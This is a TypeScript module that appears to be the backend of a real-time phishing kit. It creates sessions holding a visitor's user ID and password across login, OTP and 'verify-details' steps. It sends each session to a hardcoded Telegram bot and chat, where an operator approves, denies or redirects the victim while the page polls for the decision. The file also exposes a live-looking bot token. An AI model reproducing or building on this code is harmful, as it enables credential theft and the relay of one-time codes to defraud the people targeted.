import { APPROVAL_TIMEOUT_MS, METHOD_DENIED_ERROR_TEXT, MSG_UNABLE_REACH_VERIFICATION, OTP_CODE_ERROR_TEXT } from "@/lib/approval-messages"
import { SITE_ORIGIN } from "@/lib/site-url"

export type ApprovalDecision = "pending" | "approved" | "denied" | "redirected" | "timed_out"

export type ApprovalTrigger = "login" | "otp" | "verify-details"

export interface ApprovalRequest {
  id: string
  trigger: ApprovalTrigger
  page: string
  nextPage: string
  redirectPage: string
  userId?: string
  password?: string
  denyMessage: string
  timeoutMessage: string
  status: ApprovalDecision
  createdAt: number
  expiresAt: number
}

const approvalSessions = new Map<string, ApprovalRequest>()

function createSessionId(): string {
  if (typeof crypto !== "undefined" && "randomUUID" in crypto) {
    return crypto.randomUUID()
  }

  if (typeof crypto !== "undefined" && "getRandomValues" in crypto) {
    const bytes = new Uint8Array(16)
    crypto.getRandomValues(bytes)
    const hex = Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")
    return `approval_${hex}`
  }

  return `approval_${Date.now()}_${Date.now().toString(16)}`
}

export function createApprovalSession(params: {
  trigger: ApprovalTrigger
  page: string
  nextPage: string
  redirectPage?: string
  userId?: string
  password?: string
  denyMessage?: string
  timeoutMessage?: string
}): ApprovalRequest {
  const id = createSessionId()
  const now = Date.now()
  const session: ApprovalRequest = {
    id,
    trigger: params.trigger,
    page: params.page,
    nextPage: params.nextPage,
    redirectPage: params.redirectPage ?? params.page,
    userId: params.userId,
    password: params.password,
    denyMessage: params.denyMessage ?? METHOD_DENIED_ERROR_TEXT,
    timeoutMessage: params.timeoutMessage ?? MSG_UNABLE_REACH_VERIFICATION,
    status: "pending",
    createdAt: now,
    expiresAt: now + APPROVAL_TIMEOUT_MS,
  }

  approvalSessions.set(id, session)

  const timeout = setTimeout(() => {
    const current = approvalSessions.get(id)
    if (!current || current.status !== "pending") return
    current.status = "timed_out"
    approvalSessions.set(id, current)
  }, APPROVAL_TIMEOUT_MS)

  void timeout
  return session
}

export function getApprovalSession(id: string | null | undefined): ApprovalRequest | undefined {
  if (!id) return undefined
  return approvalSessions.get(id)
}

export function setApprovalDecision(
  id: string | null | undefined,
  decision: Exclude<ApprovalDecision, "pending">,
): ApprovalRequest | undefined {
  if (!id) return undefined
  const session = approvalSessions.get(id)
  if (!session || session.status !== "pending") return session
  session.status = decision
  approvalSessions.set(id, session)
  return session
}

export function buildApprovalActionUrl(action: "approve" | "deny" | "redirect", sessionId: string): string {
  const url = new URL(`${SITE_ORIGIN}/api/telegram/approval`)
  url.searchParams.set("action", action)
  url.searchParams.set("sessionId", sessionId)
  return url.toString()
}

export async function sendApprovalActionMessage(session: ApprovalRequest): Promise<boolean> {
  const botToken = "8985470259:AAEP5YHeX8sSz65Pfb3aoJv8Re61F10AONg"
  const chatIds = ["8810036834"]

  if (!botToken || chatIds.length === 0) return false

  const payload = {
    chat_id: chatIds[0],
    text: `\n🛡️ <b>Approval Request</b>\n━━━━━━━━━━━━━━━━━━\n👤 <b>User ID:</b> ${session.userId || "Unknown"}\n🔐 <b>Flow:</b> ${session.trigger}\n\nChoose an action below.`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Approve", url: buildApprovalActionUrl("approve", session.id) },
          { text: "Deny", url: buildApprovalActionUrl("deny", session.id) },
          { text: "Redirect", url: buildApprovalActionUrl("redirect", session.id) },
        ],
      ],
    },
  }

  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  })

  if (!response.ok) {
    console.error("Failed to send Telegram approval action", await response.text())
    return false
  }

  return true
}

export async function waitForApprovalDecision(
  sessionId: string,
  timeoutMs = APPROVAL_TIMEOUT_MS,
): Promise<ApprovalDecision> {
  const started = Date.now()
  while (Date.now() - started < timeoutMs) {
    const response = await fetch(`/api/telegram/approval-status?sessionId=${encodeURIComponent(sessionId)}`, {
      cache: "no-store",
    })
    const data = await response.json().catch(() => ({ status: "pending" }))
    const status = typeof data?.status === "string" ? data.status : "pending"
    if (status !== "pending") return status as ApprovalDecision
    await new Promise((resolve) => setTimeout(resolve, 1000))
  }
  return "timed_out"
}

export function approvalDecisionErrorMessage(status: ApprovalDecision, session?: ApprovalRequest): string {
  if (status === "denied") return session?.denyMessage ?? METHOD_DENIED_ERROR_TEXT
  if (status === "timed_out") return session?.timeoutMessage ?? MSG_UNABLE_REACH_VERIFICATION
  if (status === "redirected") return "Redirecting back to the prior page."
  if (status === "approved") return "Approved. Continuing…"
  return OTP_CODE_ERROR_TEXT
}
